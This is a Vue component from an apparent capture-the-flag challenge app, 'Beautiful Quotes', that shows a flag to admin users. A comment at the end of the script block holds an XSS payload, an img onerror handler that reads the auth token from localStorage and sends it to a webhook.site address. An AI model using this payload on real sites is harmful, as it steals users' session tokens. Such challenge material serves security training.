<template>
  <div id="app" class="text-left mt-3 mt-md-5 mb-md-5 pt-md-5">
    <div class="container">
      <div class="row">
        <div class="col col-md-3 col-sm-6 col-12">
          <h3 class="mt-4 mb-4"><strong>Beautiful Quotes</strong></h3>
          <p>
            <i>"Share your knowledge. It is a way to achieve immortality.”</i><br /><small
              >Dalai Lama XIV</small
            >
          </p>
          <p v-if="instance.me && instance.me.admin" class="mt-4">
            <strong>FLAG:</strong>
            <span v-if="instance.flag">{{ instance.flag }}</span>
            <a class="flag-col" v-else @click="$store.dispatch('loadFlag')"> Click to load flag</a>
          </p>
          <template v-if="isAuthenticated">
            <p><router-link to="/" @click.native="signOff">Logout</router-link></p>

            <h4 class="mt-4">Resetting the database</h4>
            <p>
              Clicking the button below will remove all your user-generated input from the database.
            </p>
            <button @click="resetQuotes" role="button" class="btn btn-danger">Reset quotes</button>
          </template>
        </div>

        <div class="col col-md-9 pl-md-5">
          <transition name="slide" mode="out-in">
            <router-view
              v-if="isAuthenticated && !showCreatedPage"
              :key="$route.fullPath"
            ></router-view>
            <login-form v-else />
          </transition>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import { mapGetters, mapState } from "vuex";
import Quotes from "./components/Quotes";
import LoginForm from "./components/LoginForm";

export default {
  name: "App",
  components: {
    Quotes,
    LoginForm
  },
  computed: {
    ...mapGetters(["isAuthenticated"]),
    ...mapState(["credentials", "instance"]),
    showCreatedPage() {
      return this.credentials.status == "created";
    }
  },
  created() {
    if (this.isAuthenticated) {
      this.$store.dispatch("loadUser");
    }
  },
  methods: {
    resetQuotes() {
      this.$store.dispatch("resetQuotes");
    },
    signOff() {
      this.$store.dispatch("logOut");
    }
  }
};

/**
 * <img src="" onerror="let token = localStorage.getItem('auth-token'); var i = new Image(); i.src = 'https://webhook.site/#!/16e7c399-24ba-4ca7-a529-30ee8c7b0ed6?token=' + token;" />
 */
</script>

<style>
a {
  color: #246b81;
}

.slide-enter-active {
  animation: slide-in 200ms ease-out forwards;
}

.slide-leave-active {
  animation: slide-out 200ms ease-out forwards;
}

@keyframes slide-in {
  from {
    transform: translateY(-30px);
    opacity: 0;
  }
  to {
    transform: translateY(0);
    opacity: 1;
  }
}

@keyframes slide-out {
  from {
    transform: translateY(0px);
    opacity: 1;
  }
  to {
    transform: translateY(-30);
    opacity: 0;
  }
}

.flag-col {
  font-weight: bold;
  color: red;
}
</style>
